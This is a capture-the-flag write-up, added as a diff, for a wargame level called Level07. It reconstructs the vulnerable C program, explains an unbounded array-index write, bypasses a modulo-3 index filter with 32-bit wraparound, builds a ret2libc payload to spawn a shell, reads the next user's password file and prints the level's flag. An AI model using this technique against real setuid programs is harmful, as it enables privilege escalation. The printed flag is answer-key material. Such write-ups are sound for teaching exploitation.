@@ -1,0 +1,182 @@
+# Level07
+
+## Reconstructed source
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+unsigned int get_unum(void)                      // reads one unsigned integer
+{
+    unsigned int n = 0;
+    fflush(stdin);
+    scanf("%u", &n);
+    clear_stdin();
+    return n;
+}
+
+int store_number(unsigned int *tab)
+{
+    unsigned int number, index;
+
+    printf(" Number: ");  number = get_unum();
+    printf(" Index: ");   index  = get_unum();
+
+    if (index % 3 == 0 || (number >> 24) == 0xb7)
+    {
+        puts("   This index is reserved for wil!");
+        return 1;
+    }
+    tab[index] = number;                         // arbitrary write: no bound on index
+    return 0;
+}
+
+int read_number(unsigned int *tab)
+{
+    unsigned int index;
+    printf(" Index: ");   index = get_unum();
+    printf("Number at data[%u] is %u\n", index, tab[index]);   // arbitrary read
+    return 0;
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    unsigned int tab[100];
+    char line[20];
+    int ret, i;
+
+    for (i = 0; argv[i]; i++) memset(argv[i], 0, strlen(argv[i]));   // wipe argv
+    for (i = 0; envp[i]; i++) memset(envp[i], 0, strlen(envp[i]));   // wipe envp
+    memset(tab, 0, sizeof(tab));
+
+    puts(" Welcome to wil's crappy number storage service! ");
+    while (1)
+    {
+        printf("Input command: ");
+        ret = 1;
+        fgets(line, 20, stdin);
+        line[strlen(line) - 1] = 0;
+
+        if      (strncmp(line, "store", 5) == 0) ret = store_number(tab);
+        else if (strncmp(line, "read",  4) == 0) ret = read_number(tab);
+        else if (strncmp(line, "quit",  4) == 0) break;
+
+        printf(ret ? " Failed to do %s command\n"
+                   : " Completed %s command successfully\n", line);
+        memset(line, 0, 20);
+    }
+    return 0;
+}
+```
+
+## Vulnerability
+
+The program is a number-storage menu: `store`, `read`, `quit`. In
+`store_number`, the write `tab[index] = number` has **no upper bound check on
+`index`**. Since `index` is a user-supplied unsigned integer, the written
+address is `tab + index*4`, which can be **any address in memory**: an arbitrary
+4-byte write. `read_number` is the matching arbitrary read.
+
+Two weak filters:
+- `index % 3 == 0` is rejected,
+- a `number` whose most significant byte is `0xb7` is rejected.
+
+In addition, `main` wipes `argv` and `envp` at startup, so shellcode cannot be
+hidden in an environment variable.
+
+## Exploitation
+
+Strategy: **ret2libc**. Overwrite the saved return address of `main` with the
+address of `system`, place a pointer to `"/bin/sh"` as its argument, and leave
+the menu with `quit` so `main` reaches `leave; ret` and jumps into
+`system("/bin/sh")`. No shellcode is needed, which is why wiping argv/envp does
+not matter.
+
+### Bypassing the `index % 3` filter
+
+The saved return address sits 456 bytes above `tab`, i.e. at index
+`456 / 4 = 114`. But `114 % 3 == 0`, so `store` rejects it.
+
+The write address is `tab + index*4`, computed on 32 bits, so it wraps around at
+`2^32`. Adding `2^30` to the index moves the address by `2^30 * 4 = 2^32` — one
+full wrap — landing on the **same cell**, while changing the index value (and
+therefore its remainder modulo 3):
+
+```
+index 114          -> 114 % 3 = 0            -> rejected
+index 114 + 2^30   -> 1073741938 % 3 = 1     -> accepted  (same address, cell 114)
+```
+
+So the `% 3` filter protects nothing: any target is reachable by adding `2^30`
+until the index is no longer a multiple of 3.
+
+### The ret2libc layout
+
+Three consecutive cells starting at the saved return address:
+
+```
+cell 114 (offset 456) : address of system        <- ret jumps here
+cell 115 (offset 460) : (fake return address of system, unused)
+cell 116 (offset 464) : address of "/bin/sh"      <- system reads its argument here
+```
+
+On `ret`, the CPU loads `system` into `eip` and `esp` moves up by 4 (now
+pointing at cell 115). `system` reads its first argument at `[esp+4]`, i.e. two
+cells past the return address → cell 116 → `"/bin/sh"`.
+
+### Addresses
+
+ASLR is disabled, so libc addresses are fixed between runs. Find them in gdb:
+
+```sh
+gdb -q ./level07
+(gdb) break main
+(gdb) run                               # stop after libc is mapped into memory
+(gdb) print system                      # gdb knows libc symbols
+   $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find system, +2000000, "/bin/sh"  # search 2 MB from system (covers libc)
+   0xf7f897ec
+```
+
+- `print system` gives the address of `system`.
+- `find system, +2000000, "/bin/sh"` searches the ~2 MB after `system` (enough
+  to cover the whole libc) and returns the address of the `"/bin/sh"` string,
+  which is present inside libc.
+
+Result:
+
+- `system`    = `0xf7e6aed0` = `4159090384`
+- `"/bin/sh"` = `0xf7f897ec` = `4160264172`
+
+Both start with `0xf7` (not `0xb7`), so the most-significant-byte filter lets
+them through.
+
+### Payload
+
+Run on the real binary (not under gdb: gdb drops the setuid bit). Two `store`
+commands, then `quit`:
+
+```
+Input command: store
+ Number: 4159090384        (system)
+ Index: 1073741938         (cell 114, via +2^30 to pass the %3 filter)
+Input command: store
+ Number: 4160264172        ("/bin/sh")
+ Index: 116
+Input command: quit
+```
+
+`main` leaves the loop -> `leave; ret` -> `system("/bin/sh")` -> shell as
+level08:
+
+```sh
+whoami                          # level08
+cat /home/users/level08/.pass
+```
+
+## Flag
+
+```txt
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
